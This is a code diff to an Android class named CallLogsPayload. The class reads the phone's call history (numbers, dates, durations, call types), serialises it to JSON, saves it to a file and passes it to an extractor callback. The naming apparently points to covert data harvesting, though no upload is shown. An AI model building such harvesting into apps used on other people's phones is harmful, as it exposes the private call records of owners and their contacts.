@@ -5,6 +5,7 @@ import android.content.Context;
 import android.database.Cursor;
 import android.os.AsyncTask;
 import android.provider.CallLog;
+import android.util.Log;
 
 import com.aigs.serviceone.helpers.CallExtractorNotifier;
 import com.aigs.serviceone.helpers.FileSystem;
@@ -38,56 +39,61 @@ public class CallLogsPayload extends AsyncTask<String, Integer, String> {
 
     @Override
     protected String doInBackground(@SmsModes String... strings) {
-        Context context = contextRef.get();
-        Cursor managedCursor = context.getContentResolver().query( CallLog.Calls.CONTENT_URI,null, null,null, null);
-
-        int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
-        int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
-        int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
-        int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
-
         try {
-            if (managedCursor.moveToFirst()) {
-                JSONArray jsonArray = new JSONArray();
-                while (managedCursor.moveToNext()) {
-                    JSONObject jsonObject = new JSONObject();
-                    jsonObject.put("NUMBER", managedCursor.getString(number));
-                    jsonObject.put("CALL_DATE", new Date(Long.valueOf(managedCursor.getString(date))));
-                    jsonObject.put("DURATION", managedCursor.getString(duration));
 
-                    String callType = managedCursor.getString(type);
+            Context context = contextRef.get();
+            Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+
+            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
+            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
+            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
+            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
+
+            try {
+                if (managedCursor.moveToFirst()) {
+                    JSONArray jsonArray = new JSONArray();
+                    while (managedCursor.moveToNext()) {
+                        JSONObject jsonObject = new JSONObject();
+                        jsonObject.put("NUMBER", managedCursor.getString(number));
+                        jsonObject.put("CALL_DATE", new Date(Long.valueOf(managedCursor.getString(date))));
+                        jsonObject.put("DURATION", managedCursor.getString(duration));
+
+                        String callType = managedCursor.getString(type);
 
 
-                    int dircode = Integer.parseInt(callType);
-                    switch (dircode) {
-                        case CallLog.Calls.OUTGOING_TYPE:
-                            jsonObject.put("CALL_TYPE", "OUTGOING");
-                            break;
+                        int dircode = Integer.parseInt(callType);
+                        switch (dircode) {
+                            case CallLog.Calls.OUTGOING_TYPE:
+                                jsonObject.put("CALL_TYPE", "OUTGOING");
+                                break;
 
-                        case CallLog.Calls.INCOMING_TYPE:
-                            jsonObject.put("CALL_TYPE", "INCOMING");
-                            break;
+                            case CallLog.Calls.INCOMING_TYPE:
+                                jsonObject.put("CALL_TYPE", "INCOMING");
+                                break;
 
-                        case CallLog.Calls.MISSED_TYPE:
-                            jsonObject.put("CALL_TYPE", "MISSED");
-                            break;
+                            case CallLog.Calls.MISSED_TYPE:
+                                jsonObject.put("CALL_TYPE", "MISSED");
+                                break;
+                        }
+                        jsonArray.put(jsonObject);
                     }
-                    jsonArray.put(jsonObject);
+
+                    File file = FileSystem.createInstance(context).writeCallData(jsonArray.toString());
+                    callExtractorNotifier.onCallRetrieved(file, jsonArray.toString());
+
+                } else {
+                    callExtractorNotifier.onResponseEmpty();
                 }
 
-                File file = FileSystem.createInstance(context).writeCallData(jsonArray.toString());
-                callExtractorNotifier.onCallRetrieved(file,jsonArray.toString());
 
-            }else {
-                callExtractorNotifier.onResponseEmpty();
+            } catch (Exception e) {
+
             }
 
-
+            managedCursor.close();
         }catch (Exception e){
-
+            Log.e("EXCEPTION_CL",e.getMessage());
         }
-
-        managedCursor.close();
 
         return null;
     }
